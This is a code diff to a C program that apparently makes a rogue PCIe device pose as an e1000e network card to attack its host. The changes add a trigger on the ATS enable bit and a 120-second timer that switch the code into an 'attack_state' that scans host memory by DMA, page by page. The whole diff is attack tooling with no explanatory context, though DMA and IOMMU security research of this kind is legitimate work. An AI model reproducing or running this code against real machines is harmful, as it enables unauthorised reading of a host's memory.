@@ -43,6 +43,7 @@
 #include "pcie.h"
 #include "pcie-backend.h"
 #include "qemu/bswap.h"
+#include <time.h>
 
 static inline uint16_t
 uint16_min(uint16_t left, uint16_t right)
@@ -151,9 +152,9 @@ initialise_e1000e_config_space(uint32_t config_space[1024])
 	/* Link control and status */
 	C(0xF0, (/* (0x1 << 12) | */ (0x1 << 4) | 0x1) << 16);
 	/* ATS capability: dword [0] */
-	C(0x100, PCI_EXT_CAP(PCI_CAP_ID_ATS, PCI_ATS_VERSION, 0x0));
+	/*C(0x100, PCI_EXT_CAP(PCI_CAP_ID_ATS, PCI_ATS_VERSION, 0x0));*/
 	/* ATS capability: dword[1] */
-	C(0x104, PCI_ATS_PAGE_ALIGNED_REQUEST);
+	/*C(0x104, PCI_ATS_PAGE_ALIGNED_REQUEST);*/
 #undef C
 }
 
@@ -226,6 +227,12 @@ respond_to_packet(struct packet_response_state *state,
 				break;
 			case 0x1C: /* BAR 3: MSI-X */
 				mask &= uint32_mask_enable_bits(31, 14);
+				break;
+			case 0x104:
+				if (bswap32(in->data[0]) & (1 << 31)) {
+					printf("ATS set enabled!\n");
+					state->attack_state = AS_READING;
+				}
 				break;
 			}
 			write_data = (bswap32(in->data[0]) & mask) |
@@ -319,7 +326,7 @@ respond_to_packet(struct packet_response_state *state,
 int
 main(int argc, char *argv[])
 {
-	int i, send_result, read_result;
+	int send_result, read_result;
 	TLPQuadWord tlp_in_quadword[32];
 	TLPQuadWord tlp_out_header[2];
 	TLPQuadWord tlp_out_data[16];
@@ -345,10 +352,12 @@ main(int argc, char *argv[])
 		return init;
 	}
 
-	uint64_t addr, req_addr;
+	long start_seconds = -1;
+	struct timespec time;
 
 	drain_pcie_core();
 	puts("PCIe Core Drained. Let's go.");
+
 
 
 	/* The rule of thumb I wanted whilst writing this was that the card only
@@ -362,6 +371,7 @@ main(int argc, char *argv[])
 
 	while (1) {
 		wait_for_tlp(tlp_in_quadword, sizeof(tlp_in_quadword), &raw_tlp_in);
+		clock_gettime(CLOCK_UPTIME_FAST, &time);
 
 		if (is_raw_tlp_valid(&raw_tlp_in)) {
 			response = respond_to_packet(&packet_response_state,
@@ -370,23 +380,33 @@ main(int argc, char *argv[])
 				send_result = send_tlp(&raw_tlp_out);
 				assert(send_result != -1);
 			}
+
+			if (start_seconds == -1) {
+				printf("Started counting.\n");
+				start_seconds = time.tv_sec;
+			}
+
 			continue;
+		}
+
+		if (start_seconds != -1 && (time.tv_sec - start_seconds) > 120) {
+			packet_response_state.attack_state = AS_READING;
 		}
 
 		switch (packet_response_state.attack_state) {
 		case AS_UNINITIALISED:
 			break;
 		case AS_READING:
-			read_result = perform_dma_read(read_buffer, 256,
+			read_result = perform_dma_read(read_buffer, 8,
 				packet_response_state.devfn, 0, next_read_addr);
-			printf("Trying %lx...", next_read_addr);
+			printf("Trying %lx... ", next_read_addr);
 			read_addr = next_read_addr;
 			next_read_addr += 4096;
 			if (read_result == -1) {
 				printf("Fail.\n");
 			} else {
-				printf("\n");
-				hexdump(read_buffer, 256);
+				printf("Fine!\n");
+				/*hexdump(read_buffer, 256);*/
 			}
 			break;
 		}
